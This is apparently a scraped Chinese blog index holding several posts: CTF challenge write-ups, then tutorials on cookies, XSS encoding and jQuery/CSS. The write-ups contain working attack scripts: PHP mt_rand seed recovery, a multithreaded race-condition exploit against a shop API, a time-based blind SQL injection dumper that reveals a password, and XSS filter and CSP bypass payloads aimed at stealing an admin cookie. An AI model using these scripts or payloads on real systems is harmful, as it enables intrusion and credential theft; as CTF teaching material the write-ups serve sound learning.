&quot;&quot;&quot; s1 ^= (s1 &gt;&gt; 18) s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000 s1 = undo_lshift_xor_mask(s1, 7, 0x9d2c5680) s1 ^= s1 &gt;&gt; 11 s1 ^= s1 &gt;&gt; 22 return s1def undo_lshift_xor_mask(v, shift, mask): &quot;&quot;&quot;r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask) &quot;&quot;&quot; for i in range(shift, 32, shift): v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i return vdef bits(v, start, size): return lobits(v &gt;&gt; start, size)def lobits(v, b): return v &amp; ((1 &lt;&lt; b) - 1)def bit(v, b): return v &amp; (1 &lt;&lt; b)def bv(v, b): return bit(v, b) &gt;&gt; bdef php_mt_reload(state, flavour): s = state for i in range(0, N - M): s[i] = _twist_php(s[i+M], s[i], s[i+1], flavour) for i in range(N - M, N - 1): s[i] = _twist_php(s[i+M-N], s[i], s[i+1], flavour)def _twist_php(m, u, v, flavour): &quot;&quot;&quot;Emulates the `twist` and `twist_php` #defines. &quot;&quot;&quot; mask = 0x9908b0df if (u if flavour == MT_RAND_PHP else v) &amp; 1 else 0 return m ^ (((u &amp; 0x80000000) | (v &amp; 0x7FFFFFFF)) &gt;&gt; 1) ^ maskdef undo_php_mt_reload(S000, S227, offset, flavour): # m S000 # u S227 # v S228 X = S000 ^ S227 # This means the mask was applied, and as such that S227&#x27;s LSB is 1 s22X_0 = bv(X, 31) # remove mask if present if s22X_0: X ^= 0x9908b0df # Another easy guess s227_31 = bv(X, 30) # remove bit if present if s227_31: X ^= 1 &lt;&lt; 30 # We&#x27;re missing bit 0 and bit 31 here, so we have to try every possibility s228_1_30 = (X &lt;&lt; 1) for s228_0 in range(2): for s228_31 in range(2): if flavour == MT_RAND_MT19937 and s22X_0 != s228_0: continue s228 = s228_0 | s228_31 &lt;&lt; 31 | s228_1_30 # Check if the results are consistent with the known bits of s227 s227 = _undo_php_mt_initialize(s228, 228) if flavour == MT_RAND_PHP and bv(s227, 0) != s22X_0: continue if bv(s227, 31) != s227_31: continue # Check if the guessed seed yields S000 as its first scrambled state rand = undo_php_mt_initialize(s228, 228) state = php_mt_initialize(rand) php_mt_reload(state, flavour) if not S000 == state[0]: continue return rand return Nonedef main(_R000, _R227, offset, flavour): # Both were &gt;&gt; 1, so the leftmost byte is unknown _R000 &lt;&lt;= 1 _R227 &lt;&lt;= 1 for R000_0 in range(2): for R227_0 in range(2): R000 = _R000 | R000_0 R227 = _R227 | R227_0 S000 = undo_php_mt_rand(R000) S227 = undo_php_mt_rand(R227) seed = undo_php_mt_reload(S000, S227, offset, flavour) if seed: print(seed) return seeddef test_do_undo(do, undo): for i in range(10000): rand = random.randrange(1, MAX) done = do(rand) undone = undo(done) if not rand == undone: print(f&quot;-- &#123;i&#125; ----&quot;) print(bin(rand).rjust(34)) print(bin(undone).rjust(34)) breakdef test(): test_do_undo( php_mt_initialize, lambda s: undo_php_mt_initialize(s[227], 227) ) test_do_undo( php_mt_rand, undo_php_mt_rand ) exit()import requestsimport jsonurl = &quot;https://twoshot.hgame.n3ko.co/&quot;req = requests.session()r = req.get(url+&quot;index.php&quot;)r = req.get(url+&quot;random.php?times=228&quot;)data = json.loads(r.content)seed = main(data[0], data[len(data)-1], 0, 0)r = req.post(url+&quot;verify.php&quot;, data=&#123;&quot;ans&quot;:seed&#125;)print(r.content) Cosmos的二手市场 条件竞争 正常买的话肯定一直赔 在这个页面可以看到有一个获取用户信息的js方法 在这个页面可以看到JSON格式的用户信息 properties为每个商品的持有量 多线程快速买入,来不及减钱就买入商品 可以看到初始余额为1485400,第一个商品10000，理论最大能买148个，然而我们可以看到一轮购买后买了一千多个 又快速卖出,来不及减商品 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import threadingimport requestsimport jsonimport timedef worker(i,data): if i % 2 == 0: url=&quot;&#123;&#125;?method=solve&quot;.format(host) else: url = &quot;&#123;&#125;?method=buy&quot;.format(host) try: s.post(url=url,data=data) except: print(&quot;[-] Request Failed&quot;) returnhost=&quot;http://121.36.88.65:9999/API/&quot;user = &#123; &quot;name&quot;: &quot;roc&quot;, &quot;password&quot;: &quot;123456&quot;&#125;s = requests.session()s.post(url=&quot;&#123;&#125;?method=login&quot;.format(host), data=user)i=1while True: data=&#123; &quot;code&quot;: &#x27;800001&#x27;, &quot;amount&quot;: &#x27;500&#x27; &#125; info = json.loads(s.get(&quot;&#123;&#125;?method=getinfo&quot;.format(host)).text) money = info[&#x27;data&#x27;][&#x27;money&#x27;] properties = info[&#x27;data&#x27;][&#x27;properties&#x27;] print(money) print(properties) if money &gt; 100000000: print(s.get(&quot;&#123;&#125;?method=getflag&quot;.format(host)).text) break if i % 2 == 0: amount = int(properties[0][&#x27;amount&#x27;]) else: amount = money // 10000 if amount &gt; 500: amount = 500 data[&#x27;amount&#x27;] = amount for j in range(30): t = threading.Thread(target=worker,args=(i, data)) t.start() time.sleep(5) i += 1 这个脚本能买却卖不出去不知道为何。。 所以配合了BrupSuite来完成攻击,BrupSuite负责出售 Cosmos的留言板-2 sql盲注 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import requestsdef blindsql(part_columns,part_table=&quot;&quot;,part_where=&quot;1&quot;): url=&#123; &quot;login&quot;: &quot;http://139.199.182.61:19999/login.php&quot;, &quot;action&quot;: &quot;http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=&#123;&#125;&quot; &#125; user = &#123;&quot;name&quot;: &quot;admin1&quot;,&quot;password&quot;: &quot;admin1&quot;,&quot;submit&quot;: &quot;1&quot;&#125; sleeptime=3 s=requests.session() s.post(url=url[&#x27;login&#x27;], data=user) if part_table: part_table = part_table sqlBase = &quot;-1 or if((&#123;&#125;)=&#123;&#125;,sleep(&quot;+str(sleeptime) +&quot;),0);&quot; # get data length sqlGetLength = &quot;select t.a from (select length(group_concat(concat_ws(&#x27;:&#x27;,&#123;columns&#125;))) as a &#123;table&#125; where &#123;where&#125;)t&quot;.format(columns=part_columns, table=part_table, where=part_where) length = 1 # -1 or if((select t.a from (select length(group_concat(concat_ws(&#x27;:&#x27;,aaaa))) as a from bbbb where 1)t)=1,sleep(3),0); # -1 or if((select t.a from (select ascii(mid(group_concat(concat_ws(&#x27;:&#x27;,database())),2,1)) as a from where 1)t)=86,sleep(3),0); while True: req =s.get(url=url[&#x27;action&#x27;].format(sqlBase).format(sqlGetLength,length)) if req.elapsed.total_seconds() &gt;sleeptime: tmp=url[&#x27;action&#x27;].format(sqlBase).format(sqlGetLength,length) #print(tmp) ans=&quot;*&quot;*length print(ans,end=&quot;&quot;) break length += 1 chars=list(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890:-_,&quot;) for i in range(length): sqlGetContent = &quot;select t.a from (select ascii(mid(group_concat(concat_ws(&#x27;:&#x27;,&#123;columns&#125;)),&#123;num&#125;,1)) as a &#123;table&#125; where &#123;where&#125;)t&quot;.format(columns=part_columns, num=str(i+1), table=part_table,where=part_where) for j in range(len(chars)): char=str(ord(chars[j])) req = s.get(url=url[&#x27;action&#x27;].format(sqlBase).format(sqlGetContent,char)) print(url[&#x27;action&#x27;].format(sqlBase).format(sqlGetContent,char)) if req.elapsed.total_seconds() &gt;sleeptime: ans = list(ans) ans[i] = chars[j] ans = &quot;&quot;.join(ans) print(&quot;\\r&quot;+ans,end=&quot;&quot;) breakblindsql(&quot;database()&quot;) blindsql(&quot;table_name&quot;, &quot;information_schema.tables&quot;, &quot;table_schema=&#x27;babysql&#x27;&quot;)#注出当前所有表名 messages,user# # #blindsql(&quot;column_name&quot;, &quot;information_schema.columns&quot;, &quot;table_schema =database() and table_name=&#x27;user&#x27;&quot;) # #注出user表额字段名 id,name,password# #blindsql(&quot;name,password&quot;,&quot;user&quot;,&quot;name=&#x27;cosmos&#x27;&quot;) # #注出cosmos的密码cosmos:f1FXOCnj26Fkadzt4Sqynf6O7CgR#注出密码后登录cosmos的账号即可拿到flag#先随便留条言再用此脚本 Cosmos的聊天室 CSP CSP详解 script被过滤了一次，双写绕过 &lt;/span&gt;&lt;scscriptript&gt;alert(document.cookie)&lt;/scrscriptipt&gt;&lt;span&gt;提交查看页面源代码 但是却没有被触发,F12看一下 说明被CSP（Content Security Policy)拦截了 CSP为: default-src 'self'; script-src 'self' default-src default-src 指令定义了那些没有被更精确指令指定的（默认）安全策略。该指令包含了以下指令： child-src connect-src font-src img-src media-src object-src script-src style-src script-src The script-src directive specifies valid sources for JavaScript. When either the script-src or the default-src directive is included, inline script and eval() are disabled unless you specify ‘unsafe-inline’ and ‘unsafe-eval’, respectively. Note: If this directive is absent the user agent will look for the default-src directive. self代表和文档同源，包括相同的 URL 协议和端口号。 它限制了内联 JS 脚本，并且限制了引入的静态资源文件只能从同域下加载。在实际应用中，遇到这种CSP 一般是找该站是否有文件上传点，上传一个内容为alert(/xss/)的图片再引用，也可以同源下有没有可以执行任意 JS 代码的 evil.js 文件。本题中有一个接口/send，它会返回过滤后的消息内容，我们可以利用这个接口，在一次 send 中再引入一次 send，向它传入参数，将它作为 JS 文件引入，即 &lt;scriscriptpt src=&quot;/send?message=alert(1)&quot;&gt;&lt;/scscriptript&gt; ⻚面成功弹窗，之后将JS 内容换成 XSS 平台的接收代码，或者 VPS 上的接收代码接收管理员 Cookie 即可."},{"title":"cookie机制","date":"2020-02-05","updated":"2024-03-19","path":"2020/02/05/cookie机制/","text":"Cookie 的实现机制 Cookie 是由客户端保存的小型文本文件，其内容为一系列的键值对。 Cookie是由HTTP服务器设置的，保存在浏览器中， 在用户访问其他页面时，会在HTTP请求中附上该服务器之前设置的Cookie。 Cookie的实现标准定义在 RFC2109: HTTP State Management Mechanism 中。 那么Cookie是怎样工作的呢？下面给出整个Cookie的传递流程： 浏览器向某个URL发起HTTP请求（可以是任何请求，比如GET一个页面、POST一个登录表单等） 对应的服务器收到该HTTP请求，并计算应当返回给浏览器的HTTP响应。 HTTP响应包括请求头和请求体两部分，可以参见：读 HTTP 协议。 在响应头加入Set-Cookie字段，它的值是要设置的Cookie。 在 RFC2109 6.3 Implementation Limits 中提到： UserAgent（浏览器就是一种用户代理）至少应支持300项Cookie， 每项至少应支持到4096字节，每个域名至少支持20项Cookie。 浏览器收到来自服务器的HTTP响应。 浏览器在响应头中发现Set-Cookie字段，就会将该字段的值保存在内存或者硬盘中。 Set-Cookie字段的值可以是很多项Cookie，每一项都可以指定过期时间Expires。 默认的过期时间是用户关闭浏览器时。 浏览器下次给该服务器发送HTTP请求时， 会将服务器设置的Cookie附加在HTTP请求的头字段Cookie中。 浏览器可以存储多个域名下的Cookie，但只发送当前请求的域名曾经指定的Cookie， 这个域名也可以在Set-Cookie字段中指定）。 服务器收到这个HTTP请求，发现请求头中有Cookie字段， 便知道之前就和这个用户打过交道了。 过期的Cookie会被浏览器删除。 总之，服务器通过Set-Cookie响应头字段来指示浏览器保存Cookie， 浏览器通过Cookie请求头字段来告诉服务器之前的状态。 Cookie中包含若干个键值对，每个键值对可以设置过期时间。 cookie 的属性选项 每个cookie都有一定的属性，如什么时候失效，要发送到哪个域名，哪个路径等等。这些属性是通过cookie选项来设置的，cookie选项包括：expires、domain、path、secure、HttpOnly。在设置任一个cookie时都可以设置相关的这些属性，当然也可以不设置，这时会使用这些属性的默认值。在设置这些属性时，属性之间由一个**分号和一个空格**隔开。代码示例如下： 1&quot;key=name; expires=Thu, 25 Feb 2016 04:18:00 GMT; domain=ppsc.sankuai.com; path=/; secure; HttpOnly&quot; expires expires选项用来设置“cookie 什么时间内有效”。expires其实是cookie失效日期，expires必须是 GMT 格式的时间（可以通过 new Date().toGMTString()或者 new Date().toUTCString() 来获得）。 如expires=Thu, 25 Feb 2016 04:18:00 GMT表示cookie讲在2016年2月25日4:18分之后失效，对于失效的cookie浏览器会清空。如果没有设置该选项，则默认有效期为session，即会话cookie。这种cookie在浏览器关闭后就没有了。 expires 是 http/1.0协议中的选项，在新的http/1.1协议中expires已经由 max-age 选项代替，两者的作用都是限制cookie 的有效时间。expires的值是一个时间点（cookie失效时刻= expires），而max-age 的值是一个以秒为单位时间段（cookie失效时刻= 创建时刻+ max-age）。 另外，max-age的默认值是-1(即有效期为 session )；若max-age有三种可能值：负数、0、正数。负数：有效期session；0：删除cookie；正数：有效期为创建时刻+ max-age domain 和 path domain是域名，path是路径，两者加起来就构成了 URL，domain和path一起来限制 cookie 能被哪些 URL 访问。 一句话概括：某cookie的 domain为“baidu.com”, path为“/ ”，若请求的URL(URL 可以是js/html/img/css资源请求，但不包括 XHR 请求)的域名是“baidu.com”或其子域如“api.baidu.com”、“dev.api.baidu.com”，且 URL 的路径是“/ ”或子路径“/home”、“/home/login”，则浏览器会将此 cookie 添加到该请求的 cookie 头部中。 所以domain和path2个选项共同决定了cookie何时被浏览器自动添加到请求头部中发送出去。如果没有设置这两个选项，则会使用默认值。domain的默认值为设置该cookie的网页所在的域名，path默认值为设置该cookie的网页所在的目录。 特别说明1： 发生跨域xhr请求时，即使请求URL的域名和路径都满足 cookie 的 domain 和 path，默认情况下cookie也不会自动被添加到请求头部中。若想知道原因请阅读本文最后一节） 特别说明2： domain是可以设置为页面本身的域名（本域），或页面本身域名的父域，但不能是公共后缀 public suffix。举例说明下：如果页面域名为 www.baidu.com, domain可以设置为“www.baidu.com”，也可以设置为“baidu.com”，但不能设置为“.com”或“com”。 secure secure选项用来设置cookie只在确保安全的请求中才会发送。当请求是HTTPS或者其他安全协议时，包含 secure 选项的 cookie 才能被发送至服务器。 默认情况下，cookie不会带secure选项(即为空)。所以默认情况下，不管是HTTPS协议还是HTTP协议的请求，cookie 都会被发送至服务端。但要注意一点，secure选项只是限定了在安全情况下才可以传输给服务端，但并不代表你不能看到这个 cookie。 下面我们设置一个 secure类型的 cookie： 1document.cookie = &quot;name=huang; secure&quot;; 之后你就能在控制台中看到这个 cookie 了，如下图所示： 这里有个坑需要注意下： 如果想在客户端即网页中通过 js 去设置secure类型的 cookie，必须保证网页是https协议的。在http协议的网页中是无法设置secure类型cookie的。 httpOnly 这个选项用来设置cookie是否能通过 js 去访问。默认情况下，cookie不会带httpOnly选项(即为空)，所以默认情况下，客户端是可以通过js代码去访问（包括读取、修改、删除等）这个cookie的。当cookie带httpOnly选项时，客户端则无法通过js代码去访问（包括读取、修改、删除等）这个cookie。 在客户端是不能通过js代码去设置一个httpOnly类型的cookie的，这种类型的cookie只能通过服务端来设置。 那我们在页面中怎么知道哪些cookie是httpOnly类型的呢？看下图： 凡是httpOnly类型的cookie，其 HTTP 一列都会打上√，如上图中的PA_VTIME。你通过document.cookie是不能获取的，也不能修改PA_VTIME的。 ——httpOnly与安全 从上面介绍中，大家是否会有这样的疑问：为什么我们要限制客户端去访问cookie？其实这样做是为了保障安全。 试想：如果任何 cookie 都能被客户端通过document.cookie获取会发生什么可怕的事情。当我们的网页遭受了 XSS 攻击，有一段恶意的script脚本插到了网页中。这段script脚本做的事情是：通过document.cookie读取了用户身份验证相关的 cookie，并将这些 cookie 发送到了攻击者的服务器。攻击者轻而易举就拿到了用户身份验证信息，于是就可以摇摇大摆地冒充此用户访问你的服务器了（因为攻击者有合法的用户身份验证信息，所以会通过你服务器的验证）。 聊一聊 cookie Web安全测试之XSS 你真的会使用XMLHttpRequest吗？ 读 HTTP 协议 RFC-2616 Cookie/Session 的机制与安全"},{"title":"xss编码-浏览器解析原理","date":"2020-02-05","updated":"2024-03-19","path":"2020/02/05/xss编码-浏览器解析原理/","text":"深入理解XSS编码–浏览器解析原理 在IE中，HTML本身的渲染是由mshtml.dll来解释生成对象并展示出来的，而JS的代码会交给Jscript9.dll去解释执行。大家可以参考MVC结构，模型就是HTML中定义得那些元素，View就是我们看到得输入框、超链接的样子（可理解为style），这些都是在mshtml.dll中在匹配、分析、生成的，而Control就由Jscript9.DLL来完成，所以JS引擎不过就是把生成的模型和View按照树形组织并管理起来。 日常中引起执行JS代码的场景： 1231 &lt;script&gt;2 on* （事件）3 javascript: （javascript伪协议） 那么在执行时，mshtml.dll到底把值字符串到底以什么形式传给jscript9.dll去解释执行的呢？在IE中，所有Javascript代码编译均由jscript9!ScriptEngine::DefaultCompile函数编译，此函数断下时，esp+4的值即指向由mshtml传过来的JS代码字符串。 对于script标签定义的JS,可以泛理解为IE会直接产生script对象，之后把innerHTML，也就是JS代码内容直接原封不动传给JS引擎去解释执行。 在javascript伪协议形式，全部字符串可以是任意的URL编码和实体字符。 在事件类型中，JS代码并不是直接解释直接，而是被封装成了一个名为onclick的function，参数是event，函数体即用户代码。查看字符串，可看到只有实体字符被还原解码，其他均无处理。可得出结论：在事件触发的情况下，只有实体字符是亲儿子，只认识解码实体字符。 最终结论就是：在IE解析HTML时，只对所有实体编码做出解码，在解析URL时，会解码URL编码，script标签时，原始文本均不做处理！ 下面摘自网络的一段XSS姿势。我们结合分析结论做出解释 1 [](javascript:alert(2)) 浏览器在拿到URL后，全字符串做URL解码，会得到javascript:开头的字符串 Y 2 `` 同上 N 3 `` 现浏览器只认&lt;,这里根本没有在文本里扫描到&lt;，故根本就不是对象，不产生IMG元素 N 4 &lt;script&gt;alert(5)&lt;/script&gt; 只扫描到了textarea类型，产生了textarea，其余字符串只是作为值字符串，值里含有&lt;字符。 N 5 &lt;script&gt;alert(6)&lt;/script&gt; 探测到了textarea对象的定义，故成对匹配出来中间的内容作为了属性来看待。 N 高级部分 6 Button 一切值原始文本均会做出实体解码。 Y 7 Button 事件触发情形，只解码实体编码 N 8 alert(9); 在script标签里，原封不动交给js引擎。 N 9 \\u0061\\u006c\\u0065\\u0072\\u0074(10); 在script标签里，原封不动交给js引擎。之后涉及JS引擎对字符串的解码。不做详细讨论。 Y 10 \\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029 同上 N 11 \\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032) 同9 N 12 alert('13\\u0027) 同9 N 13 alert('14\\u000a') 同9，稍微提一下，JS引擎解析也是查找调用（函数）的过程。不做详细讨论 Y"},{"title":"jQuery-AJAX","date":"2020-02-03","updated":"2024-03-19","path":"2020/02/03/jQuery-AJAX/","text":"什么是 AJAX？ AJAX = 异步 JavaScript 和 XML（Asynchronous JavaScript and XML）。 简短地说，在不重载整个网页的情况下，AJAX 通过后台加载数据，并在网页上进行显示。 使用 AJAX 的应用程序案例：谷歌地图、腾讯微博、优酷视频、人人网等等。"},{"title":"jQuery语法","date":"2020-02-03","updated":"2024-03-19","path":"2020/02/03/jQuery语法/","text":"什么是 jQuery ？ jQuery是一个JavaScript函数库。 jQuery是一个轻量级的&quot;写的少，做的多&quot;的JavaScript库。 jQuery库包含以下功能： HTML 元素选取 HTML 元素操作 CSS 操作 HTML 事件函数 JavaScript 特效和动画 HTML DOM 遍历和修改 AJAX Utilities 提示： 除此之外，Jquery还提供了大量的插件。 Query 语法 jQuery 语法是通过选取 HTML 元素，并对选取的元素执行某些操作。 基础语法： $(selector).action() 美元符号定义 jQuery 选择符（selector）“查询&quot;和&quot;查找” HTML 元素 jQuery 的 action() 执行对元素的操作 实例: $(this).hide() - 隐藏当前元素 $(“p”).hide() - 隐藏所有 &lt;p&gt; 元素 $(“p.test”).hide() - 隐藏所有 class=“test” 的 &lt;p&gt; 元素 $(“#test”).hide() - 隐藏所有 id=“test” 的元素 selector选择器参考css选择器 文档就绪事件 您也许已经注意到在我们的实例中的所有 jQuery 函数位于一个 document ready 函数中： 123$(document).ready(function()&#123; // 开始写 jQuery 代码... &#125;); 这是为了防止文档在完全加载（就绪）之前运行 jQuery 代码，即在 DOM 加载完成后才可以对 DOM 进行操作。 如果在文档没有完全加载之前就运行函数，操作可能失败。下面是两个具体的例子： 试图隐藏一个不存在的元素 获得未完全加载的图像的大小 **提示：**简洁写法（与以上写法效果相同）: 123$(function()&#123; // 开始写 jQuery 代码...&#125;); jQuery 入口函数: 1234567$(document).ready(function()&#123; // 执行代码&#125;);或者$(function()&#123; // 执行代码&#125;); JavaScript 入口函数: 123window.onload = function () &#123; // 执行代码&#125; jQuery 入口函数与 JavaScript 入口函数的区别： jQuery 的入口函数是在 html 所有标签(DOM)都加载之后，就会去执行。 JavaScript 的 window.onload 事件是等到所有内容，包括外部图片之类的文件加载完后，才会执行。 $(“*”) 选取所有元素 在线实例 $(this) 选取当前 HTML 元素 在线实例 $(“p.intro”) 选取 class 为 intro 的 &lt;p&gt; 元素 在线实例 $(“p:first”) 选取第一个 &lt;p&gt; 元素 在线实例 $(“ul li:first”) 选取第一个 &lt;ul&gt; 元素的第一个 &lt;li&gt; 元素 在线实例 $(“ul li:first-child”) 选取每个 &lt;ul&gt; 元素的第一个 &lt;li&gt; 元素 在线实例 $(“[href]”) 选取带有 href 属性的元素 在线实例 $(“a[target=‘_blank’]”) 选取所有 target 属性值等于 “_blank” 的&lt;a&gt; 元素 在线实例 $(“a[target!=‘_blank’]”) 选取所有 target 属性值不等于 “_blank” 的 &lt;a&gt; 元素 在线实例 $(“:button”) 选取所有 type=“button” 的 &lt;input&gt; 元素 和 &lt;button&gt; 元素 在线实例 $(“tr:even”) 选取偶数位置的&lt;tr&gt; 元素 在线实例 $(“tr:odd”) 选取奇数位置的&lt;tr&gt; 元素 在线实例 关于 : 和 [] 这两个符号的理解 ：可以理解为种类的意思，如：p:first，p 的种类为第一个。 [] 很自然的可以理解为属性的意思，如：[href] 选取带有 href 属性的元素。 (&quot;:button&quot;)为jQuery中表单选择器（貌似与过滤选择器同级），旨在选择所有的按钮，所以会找到∗∗∗∗、∗∗∗∗元素；而∗∗(&quot;:button&quot;) 为 jQuery 中表单选择器（貌似与过滤选择器同级），旨在选择所有的按钮，所以会找到 ****、**** 元素；而 **(&quot;:button&quot;)为jQuery中表单选择器（貌似与过滤选择器同级），旨在选择所有的按钮，所以会找到∗∗∗∗、∗∗∗∗元素；而∗∗(“button”)** 则为基本选择器，旨在选择为 **** 的标签。 :即为 jQuery 的过滤选择器，语法类似于 css 中的伪类选择器；其过滤选择器大概可以分为基本过滤（p:first 之类）、内容过滤（:empty）、子元素过滤(:first-child)和属性过滤 [href] 选择器。 12345678910111213141516$(&quot;#id&quot;, &quot;.class&quot;) 复合选择器$(div p span) 层级选择器 //div下的p元素中的span元素$(div&gt;p) 父子选择器 //div下的所有p元素$(div+p) 相邻元素选择器 //div后面的p元素(仅一个p)$(div~p) 兄弟选择器 //div后面的所有p元素(同级别)$(.p:last) 类选择器 加 过滤选择器 第一个和最后一个（first 或者 last）$(&quot;#mytable td:odd&quot;) 层级选择 加 过滤选择器 奇偶（odd 或者 even）$(&quot;div p:eq(2)&quot;) 索引选择器 div下的第三个p元素（索引是从0开始）$(&quot;a[href=&#x27;www.baidu.com&#x27;]&quot;) 属性选择器$(&quot;p:contains(test)&quot;) // 内容过滤选择器，包含text内容的p元素$(&quot;:emtyp&quot;) //内容过滤选择器，所有空标签（不包含子标签和内容的标签）parent 相反$(&quot;:hidden&quot;) //所有隐藏元素 visible $(&quot;input:enabled&quot;) //选取所有启用的表单元素$(&quot;:disabled&quot;) //所有不可用的元素$(&quot;input:checked&quot;) //获取所有选中的复选框单选按钮等$(&quot;select option:selected&quot;) //获取选中的选项元素 jQuery 事件 jQuery 是为事件处理特别设计的。 什么是事件？ 页面对不同访问者的响应叫做事件。 事件处理程序指的是当 HTML 中发生某些事件时所调用的方法。 实例： 在元素上移动鼠标。 选取单选按钮 点击元素 在事件中经常使用术语&quot;触发&quot;（或&quot;激发&quot;）例如： “当您按下按键时触发 keypress 事件”。 常见 DOM 事件： 鼠标事件 键盘事件 表单事件 文档/窗口事件 click keypress submit load dblclick keydown change resize mouseenter keyup focus scroll mouseleave blur unload hover jQuery hide() 和 show() 通过 jQuery，您可以使用 hide() 和 show() 方法来隐藏和显示 HTML 元素： 语法: $(selector).hide(speed,callback); $(selector).show(speed,callback); 可选的 speed 参数规定隐藏/显示的速度，可以取以下值：“slow”、“fast” 或毫秒。 可选的 callback 参数是隐藏或显示完成后所执行的函数名称。 对于可选的 callback 参数，有以下两点说明： 1.$(selector)选中的元素的个数为n个，则callback函数会执行n次； 2.callback函数名后加括号，会立刻执行函数体，而不是等到显示/隐藏完成后才执行； 3.callback既可以是函数名，也可以是匿名函数； 下面的例子演示了带有 speed 参数的 hide() 方法，并使用回调函数： 1234567$(document).ready(function()&#123; $(&quot;.hidebtn&quot;).click(function()&#123; $(&quot;div&quot;).hide(1000,&quot;linear&quot;,function()&#123; alert(&quot;Hide() 方法已完成!&quot;); &#125;); &#125;);&#125;); 下面的例子演示了带有 speed 参数的 hide() 方法，并立即使用回调函数： 1234567$(document).ready(function()&#123; $(&quot;.hidebtn&quot;).click(function()&#123; $(&quot;div&quot;).hide(1000,&quot;linear&quot;,function()&#123; alert(&quot;Hide() 方法已完成!&quot;); &#125;()); &#125;);&#125;); 被立即停止的动画不会触发回调，被立即完成的动画会触发回调。 1234567891011$(document).ready(function()&#123; $(&quot;button&quot;).click(function()&#123; $(&quot;p&quot;).hide(3000,function()&#123; alert(&quot;段落现在被隐藏了&quot;); &#125;); &#125;); $(&quot;#happy&quot;).click(function()&#123; $(&quot;p&quot;).stop(false,true); &#125;);&#125;); jQuery - 链(Chaining) 通过 jQuery，可以把动作/方法链接在一起。 Chaining 允许我们在一条语句中运行多个 jQuery 方法（在相同的元素上）。 jQuery 方法链接 直到现在，我们都是一次写一条 jQuery 语句（一条接着另一条）。 不过，有一种名为链接（chaining）的技术，允许我们在相同的元素上运行多条 jQuery 命令，一条接着另一条。 提示： 这样的话，浏览器就不必多次查找相同的元素。 如需链接一个动作，您只需简单地把该动作追加到之前的动作上。 下面的例子把 css()、slideUp() 和 slideDown() 链接在一起。“p1” 元素首先会变为红色，然后向上滑动，再然后向下滑动： 实例 1$(&quot;#p1&quot;).css(&quot;color&quot;,&quot;red&quot;).slideUp(2000).slideDown(2000); 如果需要，我们也可以添加多个方法调用。 **提示：**当进行链接时，代码行会变得很长。不过，jQuery 语法不是很严格；您可以按照希望的格式来写，包含换行和缩进。 如下书写也可以很好地运行： 实例 123$(&quot;#p1&quot;).css(&quot;color&quot;,&quot;red&quot;) .slideUp(2000) .slideDown(2000); jQuery 会抛掉多余的空格，并当成一行长代码来执行上面的代码行。 jQuery - 添加元素 通过 jQuery，可以很容易地添加新元素/内容。 添加新的 HTML 内容 我们将学习用于添加新内容的四个 jQuery 方法： append() - 在被选元素的结尾插入内容 prepend() - 在被选元素的开头插入内容 after() - 在被选元素之后插入内容 before() - 在被选元素之前插入内容 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src=&quot;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;$(document).ready(function()&#123; $(&quot;#btn1&quot;).click(function()&#123; $(&quot;p&quot;).prepend(&quot;&lt;b&gt;在开头追加文本&lt;/b&gt;。 &quot;); &#125;); $(&quot;#btn2&quot;).click(function()&#123; $(&quot;ol&quot;).prepend(&quot;&lt;li&gt;在开头添加列表项&lt;/li&gt;&quot;); &#125;);&#125;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;这是一个段落。&lt;/p&gt;&lt;p&gt;这是另外一个段落。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;列表 1&lt;/li&gt;&lt;li&gt;列表 2&lt;/li&gt;&lt;li&gt;列表 3&lt;/li&gt;&lt;/ol&gt;&lt;button id=&quot;btn1&quot;&gt;添加文本&lt;/button&gt;&lt;button id=&quot;btn2&quot;&gt;添加列表项&lt;/button&gt; &lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script src=&quot;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;function appendText()&#123; var txt1=&quot;&lt;p&gt;文本。&lt;/p&gt;&quot;; // 使用 HTML 标签创建文本 var txt2=$(&quot;&lt;p&gt;&lt;/p&gt;&quot;).text(&quot;文本。&quot;); // 使用 jQuery 创建文本 var txt3=document.createElement(&quot;p&quot;); txt3.innerHTML=&quot;文本。&quot;; // 使用 DOM 创建文本 text with DOM $(&quot;body&quot;).append(txt1,txt2,txt3); // 追加新元素&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;button onclick=&quot;appendText()&quot;&gt;追加文本&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 设置内容 - text()、html() 以及 val() 我们将使用前一章中的三个相同的方法来设置内容： text() - 设置或返回所选元素的文本内容 html() - 设置或返回所选元素的内容（包括 HTML 标记） val() - 设置或返回表单字段的值 CSS 选择器 CSS选择器用于选择你想要的元素的样式的模式。 &quot;CSS&quot;列表示在CSS版本的属性定义（CSS1，CSS2，或对CSS3）。 选择器 示例 示例说明 CSS .class .intro 选择所有class=&quot;intro&quot;的元素 1 #id #firstname 选择所有id=&quot;firstname&quot;的元素 1 * * 选择所有元素 2 element p 选择所有元素 1 element,element div,p 选择所有元素和元素 1 element element div p 选择元素内的所有元素 1 element&gt;element div&gt;p 选择所有父级是 元素的 元素 2 element+element div+p 选择所有紧接着元素之后的元素 2 [attribute] [target] 选择所有带有target属性元素 2 [attribute=value] [target=-blank] 